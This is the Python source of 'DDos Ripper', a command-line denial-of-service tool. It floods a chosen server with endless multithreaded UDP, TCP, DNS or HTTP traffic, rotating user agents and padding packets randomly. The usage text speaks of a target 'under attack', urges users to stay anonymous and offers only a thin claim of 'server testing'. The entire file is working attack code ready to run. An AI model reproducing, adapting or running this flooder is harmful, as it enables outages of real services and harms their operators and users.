from optparse import OptionParser
import time, sys, socket, threading, random, string
import urllib.request
import ssl
from dnslib import DNSRecord


def user_agent():
    global uagent

    uagents = open("useragents.txt", "r")
    uagent = uagents.readlines()
    uagents.close()
    return uagent


def headers():
    # reading headers
    global data
    headers = open("headers.txt", "r")
    data = headers.read()
    headers.close()


def set_headers_dict():
    # reading headers
    global headers_dict
    headers = open("headers.txt", "r")
    content = headers.readlines()
    headers_dict = {}
    for item in content:
        parts = item.split(':')
        headers_dict[parts[0]] = parts[1].strip()
    headers.close()


def get_random_string(len_from, len_to):
    # Random string with different length
    length = random.randint(len_from, len_to)
    letters = string.ascii_lowercase
    result_str = ''.join(random.choice(letters) for i in range(length))
    return result_str


def get_random_port():
    ports = [22, 53, 80, 443]
    return random.choice(ports)


def down_it_udp():
    i = 1
    while True:
        if random_packet_len:
            extra_data = get_random_string(0, 1000)
        else:
            extra_data = ''
        if port == 53:
            query = DNSRecord.question(resource)
            packet = bytes(query.pack())
            if error_debug:
                print('\033[92m DNS Q: ' + str(query) + ' \033[0;0m')
        else:
            packet = ("GET / HTTP/1.1"
                      + "\nHost: " + host
                      + "\nUser-Agent: " + random.choice(uagent)
                      + data
                      + "\n\n" + extra_data).encode('utf-8')
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(5)
        try:
            s.sendto(packet, (host, int(port)))
        except socket.gaierror:
            print("\033[91m Can't get server IP. Packet sending failed. Check your VPN.\033[0m")
        except BaseException as e:
            if error_debug:
                print("\033[91m Error: " + str(type(e)) + " " + str(e) + ".\033[0m")
            print("\033[91m Packet sending failed. Check your VPN.\033[0m")
        else:
            print('\033[92m Packet was sent \033[0;0m')
        finally:
            try:
                s.close()
            except BaseException as e:
                if error_debug:
                    print("\033[91m Error: " + str(type(e)) + " " + str(e) + ".\033[0m")
                    print("\033[91m Socket close failed.\033[0m")
        time.sleep(.02)

        if port:
            i += 1
            if i == 50:
                i = 1
                thread = threading.Thread(target=connect_host)
                thread.daemon = True
                thread.start()


def down_it_http():
    while True:
        protocol = 'http://'
        if port == 443:
            protocol = 'https://'

        if port in [443, 80]:
            url = f"{protocol}{host}{resource}"
        else:
            url = f"{protocol}{host}:{port}{resource}"

        http_headers = headers_dict
        http_headers['User-Agent'] = random.choice(uagent).strip()

        try:
            context = ssl._create_unverified_context()
            r = urllib.request.urlopen(
                urllib.request.Request(url, headers=http_headers),
                context=context
            )
            try:
                if error_debug:
                    print('\033[92m ' + str(r.status) + ' \033[0;0m')
                    print('\033[92m ' + str(r.headers) + ' \033[0;0m')
                r.close()
            except:
                print("\033[91m Request close failed.\033[0m")
        except BaseException as e:
            if error_debug:
                print("\033[91m Error: " + str(type(e)) + " " + str(e) + ".\033[0m")
            print("\033[91m No connection with server. It could be a reason of current attack or bad VPN connection."
                  " Program will continue working.\033[0m")
        else:
            print('\033[92m HTTP-Request was done \033[0;0m')

        time.sleep(.01)


def down_it_tcp():
    while True:
        if port == 53:
            query = DNSRecord.question(resource)
            packet = bytes(query.pack())
            if error_debug:
                print('\033[92m DNS Q: ' + str(query) + ' \033[0;0m')
        else:
            packet = ("GET / HTTP/1.1"
                      + "\nHost: " + host
                      + "\nUser-Agent: " + random.choice(uagent)
                      + data
                      + "\n\n").encode('utf-8')
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        try:
            s.connect((host, int(port)))
            if s.sendto(packet, (host, int(port))):
                print('\033[92m TCP Packet was sent \033[0;0m')
            else:
                print("\033[91m shut<->down \033[0m")
        except BaseException as e:
            if error_debug:
                print("\033[91m Error: " + str(type(e)) + " " + str(e) + ".\033[0m")
            print("\033[91m No connection with server. It could be a reason of current attack or bad VPN connection."
                  " Program will continue working.\033[0m")
        finally:
            try:
                s.shutdown(1)
                s.close()
            except BaseException as e:
                if error_debug:
                    print("\033[91m Error: " + str(type(e)) + " " + str(e) + ".\033[0m")
                    print("\033[91m Socket close failed.\033[0m")

        time.sleep(.01)


def usage():
    print(''' \033[0;95mDDos Ripper 

	It is the end user's responsibility to obey all applicable laws.
	It is just like a server testing script and Your ip is visible. Please, make sure you are anonymous! \n
	Usage : python3 dripper.py [-s] [-p] [-t] [-pr] [-m] [--resource]
	-h : -help
	-s : -server ip
	-p : -port default 80
	-t : -threads default 100
	-m : -method default udp (udp/tcp/http)
	-d : -debug debug error messages
    --resource : URI or DNC lookup name under attack\033[0m ''')
    sys.exit()


def get_parameters():
    global host
    global port
    global thr
    global item
    global random_packet_len
    global attack_method
    global resource
    global error_debug
    global headers_dict
    optp = OptionParser(add_help_option=False, epilog="Rippers")
    optp.add_option("-s", "--server", dest="host", help="attack to server ip -s ip")
    optp.add_option("-p", "--port", type="int", dest="port", help="-p 80 default 80")
    optp.add_option("-t", "--threads", type="int", dest="threads", help="default 100")
    optp.add_option("-h", "--help", dest="help", action='store_true', help="help you")
    optp.add_option("-r", "--random_len", type="int", dest="random_packet_len",
                    help="Send random packets with random length")
    optp.add_option("-d", "--debug", dest="error_debug", action="store_false",
                    help="Debug error messages")
    optp.add_option("-m", "--method", type="str", dest="attack_method",
                    help="Attack method: udp (default), tcp, http")
    optp.add_option('--resource', type='str', dest='resource', help='URI or DNC lookup name under attack.', default="/")
    opts, args = optp.parse_args()
    if opts.help:
        usage()
    if opts.host is not None:
        host = opts.host
    else:
        usage()
    if opts.port is None:
        port = None
    else:
        port = opts.port

    if opts.threads is None:
        thr = 100
    else:
        thr = opts.threads

    if opts.random_packet_len:
        random_packet_len = True
    else:
        random_packet_len = False

    if opts.error_debug is None:
        error_debug = False
    else:
        error_debug = True

    if opts.attack_method and opts.attack_method in ['udp', 'tcp', 'http']:
        attack_method = opts.attack_method
    else:
        attack_method = 'udp'

    if opts.resource is not None:
        resource = opts.resource


def check_host():
    try:
        socket.gethostbyname(host)
    except:
        return False
    else:
        return True


def connect_host():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((host, int(port)))
    except:
        print("\033[91mNo connection with server. It could be a reason of current attack or bad VPN connection."
              " Program will continue send UDP-packets to the destination.\033[0m")


if __name__ == '__main__':
    if len(sys.argv) < 2:
        usage()
    get_parameters()

    if not check_host():
        print("\033[91mCheck server ip and port! Wrong format of server name or no connection.\033[0m")
        exit()

    if port:
        connect_host()

    p = str(port) if port else '(22, 53, 80, 443)'
    print("\033[92m", host, " port: ", p, " threads: ", thr, " method: ", attack_method, "\033[0m")
    print("\033[94mPlease wait...\033[0m")
    user_agent()
    headers()
    time.sleep(5)

    socket.setdefaulttimeout(5)

    thrs = []
    for i in range(int(thr)):
        if attack_method == 'udp':
            thrs.append(threading.Thread(target=down_it_udp))
        elif attack_method == 'http':
            set_headers_dict()
            thrs.append(threading.Thread(target=down_it_http))
        elif attack_method == 'tcp':
            set_headers_dict()
            thrs.append(threading.Thread(target=down_it_tcp))
        thrs[i].daemon = True  # if thread is exist, it dies
        thrs[i].start()

    while True:
        time.sleep(.2)
